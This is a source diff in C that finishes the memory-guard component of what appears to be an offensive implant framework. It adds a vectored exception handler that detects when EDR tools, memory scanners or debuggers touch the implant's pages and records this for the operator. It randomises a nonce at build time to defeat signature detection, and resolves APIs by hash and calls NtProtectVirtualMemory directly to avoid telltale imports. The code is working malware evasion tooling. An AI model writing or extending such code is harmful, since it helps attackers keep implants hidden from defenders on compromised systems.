@@ -56,24 +56,20 @@ static void memguard_generate_key(MEMGUARD_STATE *mg) {
             mg->enc_key[i + 1] = (BYTE)((r >> 8) & 0xFF);
     }
 
-    /* Static nonce — key changes each cycle so nonce reuse is safe */
-    static const BYTE nonce[MEMGUARD_NONCE_SIZE] = {
+    /* Patchable nonce — builder replaces all 12 bytes with random data.
+     * Before builder: "SPECMGRD" + 4 zero bytes (signaturable marker).
+     * After builder:  12 random bytes (unique per build).
+     * Key changes each cycle so nonce reuse across cycles is safe. */
+    static volatile const BYTE nonce[MEMGUARD_NONCE_SIZE] = {
         0x53, 0x50, 0x45, 0x43, 0x4D, 0x47, 0x52, 0x44,
         0x00, 0x00, 0x00, 0x00
     };
-    spec_memcpy(mg->nonce, nonce, MEMGUARD_NONCE_SIZE);
+    spec_memcpy(mg->nonce, (const BYTE *)nonce, MEMGUARD_NONCE_SIZE);
 }
 
 /* ------------------------------------------------------------------ */
 /*  Guard page VEH handler                                             */
 /* ------------------------------------------------------------------ */
-
-/*
- * In a full implementation, we'd register a Vectored Exception Handler
- * to catch PAGE_GUARD violations on the implant region.  For PIC
- * compatibility and test builds, we use a stub that records the region
- * and can be queried/tested.
- */
 
 #ifndef TEST_BUILD
 /* VEH handler registration via AddVectoredExceptionHandler */
@@ -84,7 +80,87 @@ typedef PVOID (__attribute__((ms_abi)) *fn_AddVectoredExceptionHandler)(
     ULONG First, PVOID Handler);
 typedef ULONG (__attribute__((ms_abi)) *fn_RemoveVectoredExceptionHandler)(
     PVOID Handle);
-#endif
+
+/*
+ * Static pointer to the active MEMGUARD_STATE so the VEH callback can
+ * find it without relying on extern globals (PIC constraint).  Set in
+ * memguard_init, cleared in memguard_cleanup.
+ */
+static MEMGUARD_STATE *g_memguard_state = NULL;
+
+/**
+ * Vectored Exception Handler for PAGE_GUARD violations.
+ *
+ * When the OS fires a STATUS_GUARD_PAGE_VIOLATION (0x80000001) the
+ * PAGE_GUARD bit is automatically cleared by the CPU.  This handler:
+ *
+ *  1. Checks if the faulting address falls within the implant region.
+ *  2. If yes: bumps the violation counter (for operator telemetry),
+ *     re-arms PAGE_GUARD on the faulting page, and resumes execution.
+ *  3. If no: passes the exception to the next handler.
+ *
+ * Re-arming uses NtProtectVirtualMemory (via our syscall wrapper) to
+ * avoid importing VirtualProtect from kernel32.
+ */
+static LONG __attribute__((ms_abi)) memguard_veh_handler(PVOID exception_info) {
+    EXCEPTION_POINTERS *ep  = (EXCEPTION_POINTERS *)exception_info;
+    EXCEPTION_RECORD   *rec = ep->ExceptionRecord;
+
+    /* Only handle guard page violations */
+    if (rec->ExceptionCode != STATUS_GUARD_PAGE_VIOLATION)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    MEMGUARD_STATE *mg = g_memguard_state;
+    if (!mg || !mg->initialized)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    /*
+     * ExceptionInformation[1] holds the virtual address that caused
+     * the guard page fault.  Check if it falls within our implant.
+     */
+    PVOID fault_addr = (PVOID)rec->ExceptionInformation[1];
+
+    ULONG_PTR fault  = (ULONG_PTR)fault_addr;
+    ULONG_PTR base   = (ULONG_PTR)mg->implant_base;
+    ULONG_PTR limit  = base + (ULONG_PTR)mg->implant_size;
+
+    if (fault < base || fault >= limit) {
+        /* Not our region — let another handler deal with it */
+        return EXCEPTION_CONTINUE_SEARCH;
+    }
+
+    /*
+     * Guard page hit on the implant region.  This means an external
+     * entity (memory scanner, EDR, debugger) touched our pages while
+     * we were not actively executing from them.  Record the event for
+     * operator-side telemetry.
+     */
+    mg->guard_violations++;
+
+    /*
+     * Re-arm the PAGE_GUARD flag.  The CPU clears it on every
+     * violation, so we must re-apply it to keep monitoring.
+     * Align the faulting address down to a page boundary (4 KB).
+     */
+    ULONG_PTR page_mask = ~((ULONG_PTR)0xFFF);
+    PVOID     page_base = (PVOID)(fault & page_mask);
+    SIZE_T    page_size = 0x1000;
+    ULONG     old_prot  = 0;
+
+    /*
+     * Determine the correct base protection.  If the implant is
+     * currently encrypted (pre-sleep), the region is RW; otherwise
+     * it is RX.  Add PAGE_GUARD on top.
+     */
+    ULONG new_prot = mg->encrypted ? PAGE_READWRITE : PAGE_EXECUTE_READ;
+    new_prot |= PAGE_GUARD;
+
+    spec_NtProtectVirtualMemory(NtCurrentProcess(), &page_base,
+                                &page_size, new_prot, &old_prot);
+
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+#endif /* !TEST_BUILD */
 
 /* ------------------------------------------------------------------ */
 /*  memguard_init                                                      */
@@ -122,16 +198,18 @@ NTSTATUS memguard_init(EVASION_CONTEXT *ctx, PVOID implant_base,
     mg->original_protect = old_protect;
 
     /* Register VEH for guard page violation handling */
+    g_memguard_state = mg;
+
     PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
     if (k32) {
         fn_AddVectoredExceptionHandler add_veh =
             (fn_AddVectoredExceptionHandler)find_export_by_hash(
                 k32, HASH_ADDVECTOREDEXCEPTIONHANDLER);
         if (add_veh) {
-            /* NOTE: In production, veh_callback would be a real handler.
-             * The handler restores guard pages after legitimate access
-             * and flags scanner access attempts for operator reporting. */
-            mg->veh_handle = NULL;  /* TODO: actual handler in Phase 05+ */
+            /* Register as first handler (First=1) so we see guard page
+             * violations before any framework-level SEH handlers. */
+            mg->veh_handle = add_veh(
+                1, (PVOID)memguard_veh_handler);
         }
     }
 #endif
@@ -414,4 +492,47 @@ NTSTATUS memguard_setup_return_spoof(EVASION_CONTEXT *ctx) {
      */
 
     return STATUS_SUCCESS;
+}
+
+/* ------------------------------------------------------------------ */
+/*  memguard_cleanup — tear down guard pages and VEH                   */
+/* ------------------------------------------------------------------ */
+
+void memguard_cleanup(EVASION_CONTEXT *ctx) {
+    if (!ctx)
+        return;
+
+    MEMGUARD_STATE *mg = &ctx->memguard;
+    if (!mg->initialized)
+        return;
+
+#ifndef TEST_BUILD
+    /* Remove the VEH handler */
+    if (mg->veh_handle) {
+        PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+        if (k32) {
+            fn_RemoveVectoredExceptionHandler remove_veh =
+                (fn_RemoveVectoredExceptionHandler)find_export_by_hash(
+                    k32, HASH_REMOVEVECTOREDEXCEPTIONHANDLER);
+            if (remove_veh)
+                remove_veh(mg->veh_handle);
+        }
+        mg->veh_handle = NULL;
+    }
+
+    /* Clear the global state pointer */
+    g_memguard_state = NULL;
+
+    /* Remove PAGE_GUARD from the implant region */
+    if (mg->implant_base && mg->implant_size > 0) {
+        PVOID  protect_base = mg->implant_base;
+        SIZE_T protect_size = mg->implant_size;
+        ULONG  old_protect  = 0;
+
+        spec_NtProtectVirtualMemory(NtCurrentProcess(), &protect_base,
+            &protect_size, PAGE_EXECUTE_READ, &old_protect);
+    }
+#endif
+
+    mg->initialized = FALSE;
 }
